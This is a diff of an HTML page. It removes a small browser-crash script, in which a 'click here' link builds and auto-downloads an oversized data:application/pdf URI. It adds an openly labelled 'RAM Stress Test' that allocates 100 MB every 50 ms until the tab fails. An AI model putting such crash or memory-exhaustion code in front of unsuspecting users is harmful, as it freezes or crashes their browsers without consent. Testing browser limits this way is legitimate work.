@@ -1,25 +1,50 @@
 <!DOCTYPE html>
-<html>
- <head>
-  <script type="text/javascript">
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>RAM Stress Test</title>
+    <style>
+        body { font-family: sans-serif; text-align: center; padding-top: 50px; }
+        #status { font-weight: bold; color: red; margin-top: 20px; }
+        button { padding: 10px 20px; font-size: 16px; cursor: pointer; }
+    </style>
+</head>
+<body>
+    <h1>Browser RAM Stress Test</h1>
+    <p>Open your browser's Task Manager (Shift + Esc) to watch the usage.</p>
+    
+    <button onclick="startEatingRam()">Start Allocating RAM</button>
+    
+    <div id="status">Status: Idle</div>
 
-    function crashit() {
-                    var arr = new Array();
-                    for (var i = 0; i < 300000; i++) {
-                        arr[i] = (i % 256);
-                    }
-                    var blob = 'data:application/pdf,' + arr;
-                    var link = document.createElement("a");
-                    link.download = "attachment";
-                    link.href = blob;
-                    link.textContent = "really"
-                    document.body.appendChild(link);
-                    link.click();
-    }
+    <script>
+        const memoryHog = [];
+        let totalAllocated = 0;
 
-  </script>
- </head>
- <body>
-     <a href="#" onclick="crashit(); return false;">click here</a>
- </body>
+        function startEatingRam() {
+            const statusDiv = document.getElementById('status');
+            statusDiv.innerText = "Status: Allocating... (Tab may freeze soon)";
+
+            // Use setInterval so the UI has a small chance to update 
+            // before the browser hits its hard limit.
+            const interval = setInterval(() => {
+                try {
+                    // Allocate 100MB chunk
+                    const chunk = new Uint8Array(1024 * 1024 * 100);
+                    chunk.fill(1); // Force physical allocation
+                    memoryHog.push(chunk);
+
+                    totalAllocated += 100;
+                    statusDiv.innerText = `Status: Allocated ~${totalAllocated} MB`;
+                    
+                    console.log(`Current Heap: ${totalAllocated} MB`);
+                } catch (e) {
+                    clearInterval(interval);
+                    statusDiv.innerText = "Status: Limit Reached or Crashed!";
+                    console.error("Memory allocation failed:", e);
+                }
+            }, 50); // Adds 100MB every 50ms
+        }
+    </script>
+</body>
 </html>
